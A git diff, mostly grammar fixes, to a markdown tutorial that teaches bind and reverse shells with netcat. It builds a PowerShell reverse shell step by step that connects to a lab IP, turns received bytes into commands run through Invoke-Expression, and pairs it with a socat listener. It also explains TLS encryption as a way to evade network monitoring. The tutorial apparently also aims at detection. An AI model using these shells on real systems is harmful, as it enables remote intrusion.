@@ -2,7 +2,7 @@
 
 A shell, its probably the goal of every security researcher, almost every critical flaws or 0-Day exploits give us a way to run a remote command inside a system (RCE - Remote Code Execution). 
 
-But copy and paste, we need to have a solid knowledge of what we are trying to reach, my goal here is to show ways that we can achieve a bind or a reverse shell and how do you detect this kind of threat.
+Before copy and paste, we need to have a solid knowledge of what we are trying to reach, my goal here is to show ways that we can achieve a bind or a reverse shell and how do you detect this kind of threat.
 
 Topics i want to cover:
 * Bind shells
@@ -33,8 +33,8 @@ Topics i want to cover:
 * Detection
     - Network analysis with Wireshark
     - Network analysis with Zeek
-    - Writing Zeek rules to detect this kind of behaviour
-    - Hunint in Windows for malicious powershell processes
+    - Writing Zeek rules to detect this kind of behavior
+    - Hunting in Windows for malicious powershell processes
 
 
 
@@ -42,7 +42,7 @@ Topics i want to cover:
 
 The word ***bind*** means that your system is ***listening*** for something, any incoming connection or any event that may trigger some action, the bind keyword is used in a lot of areas, you can have a bind function that wait for some input and will execute something based in that input.
 
-A bind shell, it's when your system invoke your shell when some event come, if we want to reach this over a network, we need a way to make this possible, and what event we can use to trigger this command line ? Yep, we can open a network port and wait for any connection, or wait for some kind of code (take a look at [Port knocking](https://en.wikipedia.org/wiki/Port_knocking)), so our goal here it's very simple, open a port inside our system and ***bind*** the incoming packets to our shell.
+A bind shell, it's when your system invoke your shell when some event comes, if we want to reach this over a network, we need a way to make this possible, and what event we can use to trigger this command line ? Yep, we can open a network port and wait for any connection, or wait for some kind of code (take a look at [Port knocking](https://en.wikipedia.org/wiki/Port_knocking)), so our goal here it's very simple, open a port inside our system and ***bind*** the incoming packets to our shell.
 
 ### The idea behind remote shells with netcat
 
@@ -55,9 +55,9 @@ GET / HTTP/1.0
 Host: www.google.com
 ```
 
-Netcat is also called as nc, it comes by default in some Linux distributions and Windows versions, most recently Windows ***do not*** have Netcat, but for educacional porpuse you can install [easily](https://sourceforge.net/projects/nc110/).
+Netcat is also called as nc, it comes by default in some Linux distributions and Windows versions, most recently Windows ***do not*** have Netcat, but for educacional purpose you can install [easily](https://sourceforge.net/projects/nc110/).
 
-The command above, open a connection into google.com at port 80 but with any data, we need pass to netcat any data we may want to, i this case i wrote a simple GET request to google itself, if you run that you will get a raw html response from google, the same way you would receive if you run curl or something like that.
+The command above, opens a connection into google.com at port 80 but with any data, we need pass to netcat any data we may want to, in this case I wrote a simple GET request to google itself, if you run that you will get a raw html response from google, the same way you would receive if you run curl or something like that.
 
 Ok, netcat also allows us to listen for connections:
 
@@ -94,7 +94,7 @@ Hello # Remote output
 85 # Remote output
 ```
 
-So yeah, this function can be "usefull", but if we can exec a software over netcat, we can exec our cmd or sh and interact from the same way we did before.
+So yeah, this function can be "useful", but if we can exec a software over netcat, we can exec our cmd or sh and interact from the same way we did before.
 
 #### Running cmd.exe over network
 
@@ -107,7 +107,7 @@ So netcat is listening for some connection at 3333 and binding everything to our
 
 # Reverse shell
 
-Understanding the idea behind the bind shell and raw socket connections, reverse shell is pretty easy, its exactly the opposite of a bind shell, instead from listen from incoming connections and exec something we will ***connect*** to a remote host and send our data to him. Easy to pick up this now, huh ? 
+After understanding the idea behind the bind shell and raw socket connections, reverse shell is pretty easy, its exactly the opposite of a bind shell, instead from listen from incoming connections and exec something we will ***connect*** to a remote host and send our data to him. Easy to pick up this now, huh ? 
 
 #### Using netcat
 
@@ -121,7 +121,7 @@ Altrough this is a very simple approach, it's a essential concept to pick it up,
 
 # Using Powershell
 
-Powershell is a rich script language from Microsoft, that give us access to almost everything inside a Windows system, its mostly used for System management and in Server configuration (think that powershell has the same power that shell script has in Linux) and as it is written on top of .Net Framework, we can access his features inside our script!
+Powershell is a rich script language from Microsoft, that give us access to almost everything inside a Windows system, its mostly used for System management and in Server configuration (think that powershell has the same power that shell script has in Linux) and as it is written on top of .Net Framework, so we can access his features inside our script!
 
 You don' need to be a expert in Powershell and programming to understand a reverse shell written in Powershell, you just need to have basic programming concepts and take a look in a [quick tutorial](https://docs.microsoft.com/en-us/powershell/scripting/samples/viewing-object-structure--get-member-?view=powershell-7).
 
@@ -134,7 +134,7 @@ First, let's define our scope based in everything said before, we will need:
 
 We need create each of this steps in Powershell scripting, so let's begin. 
 
-To make a connection in some host, we will need create a socket, a TCP socket exactly and this is available in .Net namespaces, more precisely in ***[System.Net.Sockets.TcpClient]***.
+To make a connection in some host, we will need create a socket, a TCP socket exactly, and this is available in .Net namespaces, more precisely in ***[System.Net.Sockets.TcpClient]***.
 
 ```powershell
 $target = "172.16.110.129"
@@ -146,7 +146,7 @@ $client = New-Object System.Net.Sockets.TcpClient;
 The ***New-Object*** directive allows us to create an object type in our memory, this has the same use of the ***new*** keyword, but here this create a .Net object in our Powershell script which allows us to access his features just like we are programming C# using .Net, this give us the ability to call TCPClient methods, take a look in this [C# tutorial](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=netcore-3.1), you will see that we are able to call exactly the same methods here, so let's connect to this target at this port!
 
 ```powershell
-$target="192.168.0.1"
+$target="172.16.110.129"
 $port = 443
 
 $client = New-Object System.Net.Sockets.TcpClient;
@@ -160,7 +160,7 @@ In our "attacker" machine i will use [Socat](http://www.dest-unreach.org/socat/)
 ```shell
 sudo socat -d -d TCP4-LISTEN:443,fork STDOUT
 ```
-This will open our 443 for multiple TCP connections and will print everything in our stdout, the ***-d*** is the debug level, so if you run the Powershell script command above, i will get something like that in our Linux:
+This will open our 443 for multiple TCP connections and will print everything in our stdout, the ***-d*** is the debug level, so if you run the Powershell script command above, I will get something like that in our Linux:
 
 ```
 $ sudo socat -d -d TCP4-LISTEN:443,fork STDOUT
@@ -191,7 +191,7 @@ $client.Connect($target,$port)
 $client.Close();
 ```
 
-Take a look at [Powershell Arrays](https://ss64.com/ps/syntax-arrays.html), the %{} operator, give us a shortcut to use ***foreach***, so basically i am get a 4K buffer and putting in every byte the value 0xFF (255). Now we need a way to read the stream of our tcpclient, the stream is all the data that are flowing to our socket:
+Take a look at [Powershell Arrays](https://ss64.com/ps/syntax-arrays.html), the %{} operator, give us a shortcut to use ***foreach***, so basically i am get a 4K buffer and putting in every byte the value 0xFF (255). Now we need a way to read the stream of our tcpclient, that stream is all the data that are flowing to our socket:
 
 ```powershell
 $target="172.16.110.129"
@@ -225,7 +225,7 @@ Write-Host $buff[0]; # For debugging
 $client.Close();
 ```
 
-Note that we have ***Write-Host*** here, we print the first value of our buff, this value will be the first byte itself we sent, but for execute something in our system we need that the command be in plain text, so we need decode this value into a char, or better, decode a range of bytes in our buffer into a string, for this type of decoding we will use the [.Net Text Namespace](https://docs.microsoft.com/en-us/dotnet/api/system.text.asciiencoding?view=netcore-3.1).
+Note that we have ***Write-Host*** here, we print the first value of our buff, this value will be the first byte itself we sent, but to execute something in our system we need that the command be in plain text, so we need decode this value into a char, or better, decode a range of bytes in our buffer into a string, for this type of decoding we will use the [.Net Text Namespace](https://docs.microsoft.com/en-us/dotnet/api/system.text.asciiencoding?view=netcore-3.1).
 
 ```powershell
 $target="172.16.110.129"
@@ -243,7 +243,7 @@ $command = [System.Text.ASCIIEncoding]::ASCII.GetString($buff, 0, $size);
 
 $client.Close();
 ```
-What we did here was, from the ASCIIEnconding Namespace, select the class ASCII and call his static method GetString from my $buff starting from the index 0 until reach our $size,
+What we did here was, from the ASCIIEnconding Namespace, select the class ASCII and call his static method GetString from my $buff starting from the index 0 until we reach our $size,
 now our ***$command*** variable holds the decoded string, if we send "Hello world" this variable will hold this text.
 
 ### Understanding expressions
@@ -262,7 +262,7 @@ Hello world
 
 As you can see, our Python interpreter is also capable to read raw strings and interpret in real time, this is also possible in Powershell using the cmdlet ***Invoke-Expression*** or shorter ***iex***.
 
-#### Backing to our code
+#### Back to our code
 
 Take a look in this simple example and try to understand it:
 
@@ -307,7 +307,7 @@ $client.Close();
 
 Very good, now we can send a bunch of bytes, run that and get the output, we now just need to run a loop to read until there is no more connections and send the output back!
 
-To send our messages back, we need to call the ***write*** method in our stream, it has the same arguments as the read, it gets the buffer to send, where to start and his size, but before send our data we need to be able to encode our string to send the all the bytes, this is easily accomplished by using the ***ASCII.GetBytes*** method, that requires the same arguments as ***GetString***, you see ? Powershell is very modular and intuitive to pick-up, Oh for our while loop we will need to wait the -1 response from the ***Read*** method, because that indicate to our script that the connection was lost!
+To send our messages back, we need to call the ***write*** method in our stream, it has the same arguments as the read, it gets the buffer to send, where to start and its size, but before sending data we need to be able to encode our string to send the all the bytes, this is easily accomplished by using the ***ASCII.GetBytes*** method, that requires the same arguments as ***GetString***, you see ? Powershell is very modular and intuitive to pick-up, Oh for our while loop we will need to wait the -1 response from the ***Read*** method, because that indicate to our script that the connection was lost!
 
 
 So finally, our Powershell reverse shell from scratch is:
@@ -338,11 +338,11 @@ $client.Close();
 
 ![](screenshoots/reverse_powershell.png)
 
-So yeah, it's works, with a few lines of code we achieve a r(everse Powershell, why this is more powerfull than a simple cmd.exe binded over netcat ? Because Powershell is a entire scripting languange focused on Windows, with this shell you can load DLL's in memory, execute your in-memory software and achieve administration commands!
+So yeah, it's works, with a few lines of code we achieve a reverse Powershell, why this is more powerfull than a simple cmd.exe binded over netcat ? Because Powershell is a entire scripting languange focused on Windows, with this shell you can load DLL's in memory, execute your in-memory software and achieve administration commands!
 
 # Encrypted shells
 
-Using a normal raw TCP shell is not a good idea because all of our traffic will be in plain text, you can implement your own encryption functions to save your inputs/outputs but the communication will still be able to be captured by some Network monitor, and that is not a good idea, because this can compromise the attacker and reveal his malicious activities, for this reasons is used TLS/SSL for  communications, this allows that our channel between the target will be fully encrypted and look just like a normal encrypted traffic.
+Using a normal raw TCP shell is not a good idea because all of our traffic will be in plain text, you can implement your own encryption functions to save your inputs/outputs but the communication will still be able to be captured by some Network monitor, and that is not a good idea, because this can compromise the attacker and reveal his malicious activities, or these reasons, TLS/SSL is used for communications, this allows that our channel between the target will be fully encrypted and look just like a normal encrypted traffic.
 
 
 ## TLS/SSL
@@ -351,11 +351,11 @@ Before dig in implementing an encrypted channel in our Powershell script and our
 
 TLS extends for Transport Layer Security, its designed to replace SSL(Secure Socket Layer), but as we still see both used in the wild, it's sometimes called TLS/SSL for every secure channel that use one of them.
 
-The idea behind secure channels is find a way to encrypt every data in the traffic in a known cipher algorithm, such as [Aes256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard), [Camellia](https://en.wikipedia.org/wiki/Camellia_(cipher)), [3DES](https://en.wikipedia.org/wiki/Triple_DES), [RC2](https://en.wikipedia.org/wiki/RC2) or some stream cipher, by default you will find in 90% cases the usage of AES256 + [GCM](https://en.wikipedia.org/wiki/Galois/Counter_Mode).
+The idea behind secure channels is find a way to encrypt all data in the traffic in a known cipher algorithm, such as [Aes256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard), [Camellia](https://en.wikipedia.org/wiki/Camellia_(cipher)), [3DES](https://en.wikipedia.org/wiki/Triple_DES), [RC2](https://en.wikipedia.org/wiki/RC2) or some stream cipher, by default you will find in 90% cases the usage of AES256 + [GCM](https://en.wikipedia.org/wiki/Galois/Counter_Mode).
 
-Every key exchange part happen after the TCP Handshake, so you can interpret that TLS/SSL channels run in the application that are using TCP for his connections, for every session (aka communication channel) is created an unique [shared secret](https://en.wikipedia.org/wiki/Shared_secret) that are exchange between the two points using a [Key-Exchange Algorithm](https://en.wikipedia.org/wiki/Key_exchange), with this their can exchange a common key in a secure way. Every initial operation happen in a pre-encrypted channel using [Asymmetric cryptography](https://en.wikipedia.org/wiki/Public-key_cryptography).
+Every key exchange part happens after the TCP Handshake, so you can interpret that TLS/SSL channels run in the application that are using TCP for his connections, for every session (aka communication channel) is created an unique [shared secret](https://en.wikipedia.org/wiki/Shared_secret) that are exchange between the two points using a [Key-Exchange Algorithm](https://en.wikipedia.org/wiki/Key_exchange), with this they can exchange a common key in a secure way. Every initial operation happen in a pre-encrypted channel using [Asymmetric cryptography](https://en.wikipedia.org/wiki/Public-key_cryptography).
 
-Public certifcates used for TLS/SSL connections are specified in [X.509](https://tools.ietf.org/html/rfc5280) rfc, you still can use others certificates specifications, but the most used and supported is the X.509, in this model, the certificate come with the public key used, a digital signature and metadata about the certificate, such a [Certified Authority(CA)](https://en.wikipedia.org/wiki/Certificate_authority) to validate the certified veracity
+Public certifcates used for TLS/SSL connections are specified in [X.509](https://tools.ietf.org/html/rfc5280) rfc, you still can use others certificates specifications, but the most used and supported is the X.509, in this model, the certificate comes with the public key used, a digital signature and metadata about the certificate, such a [Certified Authority(CA)](https://en.wikipedia.org/wiki/Certificate_authority) to validate the certified veracity
 
 ### Certificate creation
 
